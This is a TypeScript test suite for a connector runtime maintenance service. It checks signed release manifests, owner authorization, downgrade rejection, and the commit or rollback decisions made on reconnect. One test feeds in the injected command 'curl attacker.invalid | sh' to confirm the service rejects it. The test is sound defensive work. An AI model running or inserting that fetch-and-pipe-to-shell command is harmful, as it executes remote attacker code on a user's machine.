import { generateKeyPairSync, sign } from 'node:crypto';

import { describe, expect, test } from 'bun:test';

import { ConnectorRuntimeMaintenanceService } from '../server/connector-runtime-maintenance-service';
import { MemoryConnectorRuntimeOperationStore } from '../server/connector-runtime-operation-store';
import {
  canonicalConnectorRuntimeReleaseManifest,
  connectorRuntimeReleaseManifestSchema,
  type ConnectorRuntimeReleaseManifest
} from '../server/connector-runtime-release-manifest';
import type { MachineRecord } from '../src/shared/project-space-api';

const now = new Date('2026-07-14T00:00:00.000Z');
const keys = generateKeyPairSync('ed25519');
const capabilities = ['runtime.restart', 'runtime.update', 'worktrees.list.v2'];

function manifest(): ConnectorRuntimeReleaseManifest {
  return {
    artifacts: [{
      assetName: 'project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      bundleVersions: { connector: '0.5.0', machineTools: '0.5.0', projectCli: '0.5.0' },
      capabilities,
      downloadUrl:
        'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      protocolVersion: '2',
      sha256: 'a'.repeat(64),
      sizeBytes: 4,
      target: 'darwin-arm64'
    }],
    buildId: '1'.repeat(40),
    channel: 'stable',
    expiresAt: '2027-07-14T00:00:00.000Z',
    issuedAt: '2026-07-13T00:00:00.000Z',
    releaseId: 'v0.5.0',
    schema: connectorRuntimeReleaseManifestSchema,
    source: 'managed',
    version: '0.5.0'
  };
}

function signedManifest() {
  const value = manifest();
  return {
    manifest: value,
    signature: sign(
      null,
      Buffer.from(canonicalConnectorRuntimeReleaseManifest(value), 'utf8'),
      keys.privateKey
    ).toString('base64url')
  };
}

function currentMachine(overrides: Partial<MachineRecord> = {}): MachineRecord {
  return {
    connector: {
      capabilities,
      installCommand: 'project-space-connector',
      runtime: {
        architecture: 'arm64',
        buildId: '0'.repeat(40),
        bundleVersions: {
          connector: '0.4.0', machineTools: '0.4.0', projectCli: '0.4.0'
        },
        channel: 'stable',
        instanceId: 'instance-before',
        lastCheckedAt: now.toISOString(),
        platform: 'darwin',
        protocolVersion: '2',
        releaseId: 'v0.4.0',
        source: 'managed',
        version: '0.4.0'
      },
      status: 'online'
    },
    id: 'machine-1',
    kind: 'connector',
    name: 'Machine',
    network: {},
    roles: ['connector'],
    sourcePath: 'connector-hub',
    ...overrides
  };
}

class Harness {
  currentNow = new Date(now);
  machine: MachineRecord | null = currentMachine();
  role: 'member' | 'owner' | null = 'owner';
  releaseCalls = 0;
  dispatches: Array<Parameters<ConstructorParameters<
    typeof ConnectorRuntimeMaintenanceService
  >[0]['dispatcher']['dispatch']>[0]> = [];
  dispatchError?: Error;
  readonly operations = new MemoryConnectorRuntimeOperationStore();

  service() {
    return new ConnectorRuntimeMaintenanceService({
      directory: {
        readMachine: async () => this.machine,
        readMembership: async () => this.role ? { role: this.role } : null
      },
      dispatcher: {
        dispatch: async (input) => {
          this.dispatches.push(input);
          input.onProgress('validating');
          if (input.plan.operation === 'update') {
            input.onProgress('staging');
            input.onProgress('verifying');
          }
          if (this.dispatchError) throw this.dispatchError;
          input.onProgress('accepted');
        }
      },
      manifestPublicKey: keys.publicKey,
      now: () => new Date(this.currentNow),
      operations: this.operations,
      rateLimiter: { consume: async () => ({ allowed: true }) },
      releases: {
        loadApprovedManifest: async (releaseId) => {
          this.releaseCalls += 1;
          if (releaseId && releaseId !== 'v0.5.0') throw new Error('release mismatch');
          return signedManifest();
        }
      }
    });
  }
}

async function settleDispatch() {
  await new Promise((resolve) => setTimeout(resolve, 0));
}

describe('connector runtime maintenance service', () => {
  test('authorizes an exact update and persists reconnect expectations before dispatch', async () => {
    const harness = new Harness();
    const result = await harness.service().request(
      { machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0' },
      'owner-1'
    );
    expect(result.operation).toMatchObject({
      expectedBuildId: '1'.repeat(40),
      expectedReleaseId: 'v0.5.0',
      machineId: 'machine-1',
      operation: 'update',
      previousInstanceId: 'instance-before',
      state: 'queued'
    });
    expect(harness.dispatches[0]?.plan).toMatchObject({
      machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0'
    });
    expect(JSON.stringify(result)).not.toContain('downloadUrl');
    expect(JSON.stringify(result)).not.toContain('signature');
    await settleDispatch();
    expect((await harness.operations.latest('machine-1'))?.state).toBe('reconnecting');
  });

  test('keeps restart independent and available while already current', async () => {
    const harness = new Harness();
    harness.machine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    const result = await harness.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    expect(result.operation.operation).toBe('restart');
    expect(harness.releaseCalls).toBe(0);
    expect(harness.dispatches[0]?.plan.operation).toBe('restart');
  });

  test('rejects a signed approved release older than the installed runtime', async () => {
    const harness = new Harness();
    harness.machine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: '2'.repeat(40),
        bundleVersions: {
          connector: '0.6.0', machineTools: '0.6.0', projectCli: '0.6.0'
        },
        releaseId: 'v0.6.0',
        version: '0.6.0'
      }
    } });

    await expect(harness.service().request(
      { machineId: 'machine-1', operation: 'update', releaseId: 'v0.5.0' },
      'owner-1'
    )).rejects.toMatchObject({ code: 'release-downgrade' });
    expect(harness.releaseCalls).toBe(1);
    expect(harness.dispatches).toHaveLength(0);
    expect(await harness.operations.latest('machine-1')).toBeNull();
    expect(harness.operations.audits.at(-1)).toMatchObject({
      outcome: 'rejected', reason: 'release-downgrade'
    });
  });

  test('rejects arbitrary input, non-owners, offline and unsupported old connectors', async () => {
    const arbitrary = new Harness();
    await expect(arbitrary.service().request({
      command: 'curl attacker.invalid | sh', machineId: 'machine-1', operation: 'update'
    }, 'owner-1')).rejects.toMatchObject({ code: 'invalid-request' });
    expect(arbitrary.dispatches).toHaveLength(0);
    expect(arbitrary.operations.audits[0]).toMatchObject({
      outcome: 'rejected', reason: 'invalid-request'
    });
    expect(arbitrary.operations.audits[0]).not.toHaveProperty('machineId');

    const member = new Harness();
    member.role = 'member';
    await expect(member.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'member-1'
    )).rejects.toMatchObject({ code: 'unauthorized' });

    const offline = new Harness();
    offline.machine = currentMachine({ connector: {
      ...currentMachine().connector, status: 'offline'
    } });
    await expect(offline.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'offline' });

    const legacy = new Harness();
    legacy.machine = currentMachine({ connector: {
      capabilities: [], installCommand: 'legacy', status: 'online'
    } });
    await expect(legacy.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'unsupported-operation' });
  });

  test('persists dispatch failure and atomically refuses a conflicting operation', async () => {
    const failed = new Harness();
    failed.dispatchError = new Error('socket closed');
    await failed.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    await settleDispatch();
    expect(await failed.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'internal-error' }, state: 'failed'
    });

    const conflict = new Harness();
    await conflict.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    );
    await expect(conflict.service().request(
      { machineId: 'machine-1', operation: 'restart' }, 'owner-1'
    )).rejects.toMatchObject({ code: 'operation-conflict' });
  });

  test('commits only after an exact reconnect acknowledges the persisted decision', async () => {
    const success = new Harness();
    const started = await success.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const updated = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        buildId: manifest().buildId,
        bundleVersions: manifest().artifacts[0]!.bundleVersions,
        instanceId: 'instance-after',
        maintenance: { operationId: started.operation.id, state: 'pending-health-check' },
        releaseId: manifest().releaseId,
        version: manifest().version
      }
    } });
    expect(await success.service().decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
    expect((await success.operations.latest('machine-1'))?.state).toBe('health-checking');
    expect(await success.service().decideReconnect(updated)).toEqual({
      action: 'commit', operationId: started.operation.id
    });
    expect((await success.operations.latest('machine-1'))?.state).toBe('succeeded');

    const rolledBack = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: { operationId: started.operation.id, state: 'rolled-back' }
      }
    } });
    const corruptRollback = structuredClone(rolledBack);
    corruptRollback.connector.runtime!.buildId = 'f'.repeat(40);
    expect(await success.service().decideReconnect(corruptRollback)).toBeUndefined();
    const pinnedRollback = structuredClone(rolledBack);
    pinnedRollback.connector.runtime!.instanceId = 'instance-before';
    expect(await success.service().decideReconnect(pinnedRollback)).toBeUndefined();
    const expandedRollback = structuredClone(rolledBack);
    expandedRollback.connector.capabilities = [...capabilities, 'runtime.untrusted'];
    expect(await success.service().decideReconnect(expandedRollback)).toBeUndefined();
    expect((await success.operations.latest('machine-1'))?.state).toBe('succeeded');

    expect(await success.service().decideReconnect(rolledBack)).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
    expect(await success.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'supervisor-rollback-after-commit' },
      state: 'rolled-back'
    });
    expect(await success.service().decideReconnect(corruptRollback)).toBeUndefined();
    expect(await success.service().decideReconnect(rolledBack)).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
  });

  test('orders rollback for wrong reconnect evidence', async () => {
    const wrong = new Harness();
    const wrongStarted = await wrong.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const wrongRuntime = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-after',
        maintenance: {
          operationId: wrongStarted.operation.id, state: 'pending-health-check'
        }
      }
    } });
    expect(await wrong.service().decideReconnect(wrongRuntime)).toEqual({
      action: 'rollback', operationId: wrongStarted.operation.id
    });
    expect(await wrong.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'wrong-reconnect-version', rollbackAvailable: true },
      state: 'rolling-back'
    });

    const rolledBackMachine = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: { operationId: wrongStarted.operation.id, state: 'rolled-back' }
      }
    } });
    const wrongRollback = structuredClone(rolledBackMachine);
    wrongRollback.connector.runtime!.releaseId = 'v0.3.0';
    expect(await wrong.service().decideReconnect(wrongRollback)).toBeUndefined();
    const pinnedRollback = structuredClone(rolledBackMachine);
    pinnedRollback.connector.runtime!.instanceId = 'instance-before';
    expect(await wrong.service().decideReconnect(pinnedRollback)).toBeUndefined();
    const expandedRollback = structuredClone(rolledBackMachine);
    expandedRollback.connector.capabilities = [...capabilities, 'runtime.untrusted'];
    expect(await wrong.service().decideReconnect(expandedRollback)).toBeUndefined();
    expect((await wrong.operations.latest('machine-1'))?.state).toBe('rolling-back');

    expect(await wrong.service().decideReconnect(rolledBackMachine)).toEqual({
      action: 'rollback', operationId: wrongStarted.operation.id
    });
    expect((await wrong.operations.latest('machine-1'))?.state).toBe('rolled-back');
  });

  test('acknowledges only an exact restored runtime after a terminal health timeout', async () => {
    const timedOut = new Harness();
    const started = await timedOut.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    timedOut.currentNow = new Date(now.getTime() + 11 * 60_000);
    expect((await timedOut.service().status('machine-1')).update.operation).toMatchObject({
      lastFailure: { code: 'reconnect-timeout', rollbackAvailable: true },
      state: 'recovery-required'
    });

    const rollbackEvidence = { operationId: started.operation.id, state: 'rolled-back' } as const;
    const rolledBackMachine = (
      runtime: Partial<NonNullable<MachineRecord['connector']['runtime']>> = {}
    ) => currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-rollback',
        maintenance: rollbackEvidence,
        ...runtime
      }
    } });
    for (const mismatch of [
      { buildId: 'f'.repeat(40) },
      { instanceId: 'instance-before' },
      { releaseId: 'v0.3.0' }
    ]) {
      expect(await timedOut.service().decideReconnect(rolledBackMachine(mismatch))).toBeUndefined();
      expect((await timedOut.operations.latest('machine-1'))?.state).toBe('recovery-required');
    }

    expect(await timedOut.service().decideReconnect(rolledBackMachine())).toEqual({
      action: 'rollback', operationId: started.operation.id
    });
    expect(await timedOut.operations.latest('machine-1')).toMatchObject({
      lastFailure: { code: 'reconnect-timeout' }, state: 'rolled-back'
    });

    const failed = new Harness();
    const failedStart = await failed.service().request(
      { machineId: 'machine-1', operation: 'update' }, 'owner-1'
    );
    await settleDispatch();
    const failedAt = failed.currentNow.toISOString();
    await failed.operations.transition({
      expectedStates: ['reconnecting'], finishedAt: failedAt, id: failedStart.operation.id,
      lastFailure: {
        at: failedAt, code: 'internal-error', message: 'Dispatch failed.',
        rollbackAvailable: true
      },
      state: 'failed', updatedAt: failedAt
    });
    const failedEvidence = currentMachine({ connector: {
      ...currentMachine().connector,
      runtime: {
        ...currentMachine().connector.runtime!,
        instanceId: 'instance-failed-rollback',
        maintenance: { operationId: failedStart.operation.id, state: 'rolled-back' }
      }
    } });
    expect(await failed.service().decideReconnect(failedEvidence)).toBeUndefined();
    await failed.operations.transition({
      expectedStates: ['failed'], id: failedStart.operation.id,
      lastFailure: {
        at: failedAt, code: 'health-timeout', message: 'Health timed out.',
        rollbackAvailable: true
      },
      state: 'failed', updatedAt: failedAt
    });
    expect(await failed.service().decideReconnect(failedEvidence)).toEqual({
      action: 'rollback', operationId: failedStart.operation.id
    });
  });
});
